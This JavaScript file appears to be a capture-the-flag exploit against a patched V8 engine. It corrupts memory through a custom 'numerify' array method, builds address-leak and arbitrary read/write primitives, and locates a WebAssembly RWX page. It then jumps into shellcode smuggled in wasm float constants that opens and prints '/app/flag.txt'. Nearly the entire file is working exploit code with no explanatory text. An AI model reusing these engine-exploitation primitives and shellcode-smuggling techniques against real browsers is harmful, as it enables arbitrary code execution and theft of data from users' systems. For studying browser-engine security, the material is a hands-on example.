let object2 = {};
let object1 = {
    [Symbol.toPrimitive](hint) {
        if (hint === 'number') {
            // aa[0] = {};

            new ArrayBuffer(0x7fe00000);
            new ArrayBuffer(0x7fe00000);
            cor = [1.1];

            dbl_arr = [1.1];
            obj_arr = [dbl_arr];
            // % DebugPrint(cor);
            // % DebugPrint(dbl_arr);
            // % DebugPrint(obj_arr);
            // % SystemBreak();
            return 0x8000;
        }
        return null;
    },
};

new ArrayBuffer(0x7fe00000);
new ArrayBuffer(0x7fe00000);
new ArrayBuffer(0x7fe00000);
new ArrayBuffer(0x7fe00000);
// % DebugPrint(object1);
// % DebugPrint(a);

let aa = [object2, object2, object2, object2, object2, object1];
// % DebugPrint(aa);
// % SystemBreak();
let cor;
let dbl_arr;
let obj_arr;
aa.numerify();
// % SystemBreak();
// % DebugPrint(cor);
// console.log(cor.length);

class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            // fill up new space external backing store bytes
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }

    hex(i) {
        return i.toString(16).padStart(16, "0");
    }

    breakpoint() {
        this.buf.slice();
    }
}

var helper = new Helpers();

// =================== //
//     Start here!     //
// =================== //

function addrof(obj) {
    obj_arr[0] = obj;
    return helper.ftoil(cor[8]);
}

// console.log(addrof(cor).toString(16));

function aar(addr) {
    cor[6] = helper.pair_i32_to_f64(addr - 8, 8);
    return dbl_arr[0];
}

// console.log(aar(addrof(cor)-8));

function aaw(addr, val) {
    cor[6] = helper.pair_i32_to_f64(addr - 8, 8);
    dbl_arr[0] = val;
}

var wasmCode2 = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x04, 0x01, 0x60,
    0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x07, 0x08, 0x01, 0x04, 0x6d, 0x61,
    0x69, 0x6e, 0x00, 0x00, 0x0a, 0xa5, 0x01, 0x01, 0xa2, 0x01, 0x00, 0x44,
    0x68, 0x2f, 0x61, 0x70, 0x70, 0x58, 0xeb, 0x07, 0x44, 0x68, 0x2f, 0x66,
    0x6c, 0x61, 0x5b, 0xeb, 0x07, 0x44, 0x68, 0x67, 0x2e, 0x74, 0x78, 0x59,
    0xeb, 0x07, 0x44, 0x6a, 0x74, 0x5a, 0x90, 0x90, 0x90, 0xeb, 0x07, 0x44,
    0x48, 0xc1, 0xe2, 0x20, 0x90, 0x90, 0xeb, 0x07, 0x44, 0x48, 0x01, 0xca,
    0x52, 0x90, 0x90, 0xeb, 0x07, 0x44, 0x48, 0xc1, 0xe3, 0x20, 0x90, 0x90,
    0xeb, 0x07, 0x44, 0x48, 0x01, 0xc3, 0x53, 0x90, 0x90, 0xeb, 0x0c, 0x44,
    0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0xeb, 0x0c, 0x44, 0x6a, 0x02, 0x58,
    0x0f, 0x05, 0x90, 0xeb, 0x0c, 0x44, 0x48, 0x89, 0xc7, 0x48, 0x89, 0xe6,
    0xeb, 0x0c, 0x44, 0x6a, 0x42, 0x5a, 0x90, 0x90, 0x90, 0xeb, 0x0c, 0x44,
    0x48, 0x29, 0xd6, 0x90, 0x90, 0x90, 0xeb, 0x0c, 0x44, 0x48, 0x31, 0xc0,
    0x0f, 0x05, 0x90, 0xeb, 0x0c, 0x44, 0x6a, 0x01, 0x5f, 0x90, 0x90, 0x90,
    0xeb, 0x0c, 0x44, 0x6a, 0x01, 0x58, 0x0f, 0x05, 0x90, 0x90, 0x90, 0x1a,
    0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a,
    0x1a, 0x1a, 0x1a, 0x0b
]);
var wasmModule2 = new WebAssembly.Module(wasmCode2);
var wasmInstance2 = new WebAssembly.Instance(wasmModule2, {});
var f2 = wasmInstance2.exports.main;


var wasmCode = new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
    130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
    128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128,
    0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10,
    138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11,
]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

let Instance_addr = addrof(wasmInstance);
// console.log("Instance_addr: ", helper.hex(Instance_addr));

// % DebugPrint(wasmInstance);

var trusted = helper.ftoil(aar(Instance_addr + 0xc));
var ja = trusted + 0x30;


let Instance2_addr = addrof(wasmInstance2);
// console.log("Instance2_addr: ", helper.hex(Instance2_addr));
var trusted2 = helper.ftoil(aar(Instance2_addr + 0xc));
var ja2 = trusted2 + 0x30;
var rwx_page = helper.f64toi64(aar(ja2))

// console.log("[*] leak rwx_page addr: 0x" + rwx_page.toString(16));

// % DebugPrint(wasmInstance2);
// // %DebugPrint(wasmInstance);
// % DebugPrint(f2);


aaw(ja, helper.i64tof64(rwx_page + 0x85an));

for (var i = 0; i < 0x10000; i++) {
    f2();
}
// % SystemBreak();

for (var i = 0; i < 0x10000; i++) { }

f();